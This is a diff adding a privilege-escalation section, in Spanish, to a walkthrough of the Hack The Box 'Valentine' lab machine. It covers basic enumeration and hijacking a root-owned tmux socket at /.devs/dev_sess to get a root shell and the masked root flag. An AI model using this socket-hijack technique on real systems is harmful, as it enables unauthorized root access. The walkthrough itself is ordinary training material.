@@ -158,3 +158,57 @@ hype@Valentine:~/Desktop$ cat user.txt
 e6710a5464769fd5fcd2xxxxxxxxxxxxxxx
 ```
 Conseguimos conectarnos y conseguimos la flag del `user.txt`
+
+# Escalada de Privilegios
+Procedemos a enumerar un poco el sistema con comandos basicos:
+Usamos el comando `ìd` para ver los grupos a los que pertenece el usuario `hype` 
+```bash
+hype@Valentine:~/Desktop$ id
+uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
+```
+Usamos el comando `uname -a` para sacar informacion sobre el sistema
+```bash
+hype@Valentine:~/Desktop$ uname -a
+Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+```
+Vemos si tiene algun puerto relevante internamente con el comando `netstat -antp`
+```bash
+hype@Valentine:~/Desktop$ netstat -antp
+(No info could be read for "-p": geteuid()=1000 but you should be root.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
+tcp        0    488 10.10.10.79:22          10.10.16.132:49820      ESTABLISHED -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
+tcp6       0      0 :::443                  :::*                    LISTEN      -  
+```
+Procedemos a realizar uso del comando `ps -aux` para listar los comandos que se estan ejecutando a nivel de sistema.
+Encontramos una session de `tmux` en la ruta `/.devs/dev_sess` en los procesos. Intentamos apuntar a ella.
+```bash
+hype@Valentine:~/Desktop$ ps -aux
+Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root       1017  0.0  0.1  26416  1672 ?        Ss   05:10   0:00 /usr/bin/tmux -S /.devs/dev_sess
+```
+Conseguimos acceder al directorio `/.devs` y procedemos a intentar apropiarnos de la sesion de `tmux`
+```bash
+hype@Valentine:~/Desktop$ cd /.devs/
+hype@Valentine:/.devs$ ls
+dev_sess
+```
+Nos conseguimos apropiar de la session correctamente y vemos que ya somos `root`.
+```bash
+hype@Valentine:/.devs$ tmux -S dev_sess
+```
+Sacamos la flag de root
+```bash
+root@Valentine:/.devs# whoami
+root
+root@Valentine:/.devs# cat /root/root.txt
+f1bb6d759df1f272914exxxxxxxxxxxxx
+```
+
+Maquina Rooteada =D 
